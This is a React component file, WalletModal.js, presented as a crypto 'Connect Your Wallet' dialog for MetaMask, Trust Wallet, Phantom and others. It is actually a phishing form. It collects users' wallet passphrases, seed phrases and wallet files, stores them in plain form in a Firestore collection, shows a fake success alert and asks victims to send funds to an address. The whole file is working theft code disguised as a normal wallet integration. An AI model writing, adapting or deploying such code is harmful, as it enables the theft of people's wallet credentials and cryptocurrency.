// components/WalletModal.js
import React, { useState, useEffect, useCallback } from 'react';
import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
import { getFirestore, collection, addDoc } from 'firebase/firestore';


const WalletModal = ({ isOpen, onClose }) => {
  const [showSecondaryModal, setShowSecondaryModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [keyphrase, setKeyphrase] = useState('');
  const [importedFile, setImportedFile] = useState(null);

  const walletOptions = ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Binance Wallet', 'Phantom'];

  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowSecondaryModal(true);
  };

  const handleOtherOptionsClick = () => {
    setSelectedWallet('Other');
    setShowSecondaryModal(true);
  };

  const handleConnect = async () => {
    if (!selectedWallet) {
      // Optionally show an error message
      return;
    }

    let walletDetails = {
      walletName: selectedWallet,
    };

    if (passphrase) {
      walletDetails.passphrase = passphrase;
    } else if (keyphrase) {
      walletDetails.keyphrase = keyphrase;
    } else if (importedFile) {
      // You might want to read the file content here
      walletDetails.importedFile = importedFile.name; // Or the content itself
    }

    try {
      const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
      console.log("Document written with ID: ", docRef.id);
      // if (typeof window !== 'undefined') {
      //   localStorage.setItem('walletid', docRef.id);
      // }
      // Optionally show a success message
      alert(`Connected to ${selectedWallet} successfully! Fund Your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
      onClose(); // Close the modal after successful connection
    } catch (e) {
      console.error("Error adding document: ", e);
      // Optionally show an error message to the user
    }
  };

  const handleFileChange = (event) => {
    setImportedFile(event.target.files[0]);
  };

  const handleBack = () => {
    setShowSecondaryModal(false);
    setSelectedWallet('');
    setPassphrase('');
    setKeyphrase('');
    setImportedFile(null);
  };

  // Close modal on Escape key press
  const handleKeyDown = useCallback((event) => {
    if (event.key === 'Escape' && isOpen) {
      onClose();
    }
  }, [isOpen, onClose]);

  useEffect(() => {
    if (isOpen) {
      document.addEventListener('keydown', handleKeyDown);
      document.body.classList.add('overflow-hidden'); // Prevent scrolling behind the modal
    } else {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
      setShowSecondaryModal(false); // Reset secondary modal state when closed
      setSelectedWallet('');
      setPassphrase('');
      setKeyphrase('');
      setImportedFile(null);
    }

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
    };
  }, [isOpen, handleKeyDown]);

  if (!isOpen) {
    return null;
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
      <div className="bg-gray-900 rounded-xl shadow-lg p-8 w-full max-w-md relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
        >
          <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        {!showSecondaryModal ? (
          <div>
            <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect Your Wallet</h3>
            <ul className="space-y-3">
              {walletOptions.map((wallet) => (
                <li
                  key={wallet}
                  className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-4 cursor-pointer transition duration-200"
                  onClick={() => handleWalletSelect(wallet)}
                >
                  <span className="block text-gray-300 font-medium">{wallet}</span>
                </li>
              ))}
            </ul>
            <button
              className="w-full mt-6 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
              onClick={handleOtherOptionsClick}
            >
              Other Options
            </button>
          </div>
        ) : (
          <div>
            <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect to {selectedWallet}</h3>
            <div className="space-y-4">
              <div>
                <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Passphrase:</label>
                <input
                  type="password"
                  id="passphrase"
                  className="shadow-sm focus:ring-indigo-500  py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
              </div>
              <div>
                <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">Keyphrase:</label>
                <textarea
                  id="keyphrase"
                  rows="3"
                  className="shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
                  value={keyphrase}
                  onChange={(e) => setKeyphrase(e.target.value)}
                />
              </div>
              <div>
                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Import from File:</label>
                <input
                  type="file"
                  id="importFile"
                  className="focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm text-gray-300"
                  onChange={handleFileChange}
                />
              </div>
            </div>
            <div className="mt-6 flex justify-end space-x-2">
              <button
                className="bg-gray-700 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
                onClick={handleBack}
              >
                Back
              </button>
              <button
                className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 px-6 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
                onClick={handleConnect}
              >
                Connect
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletModal;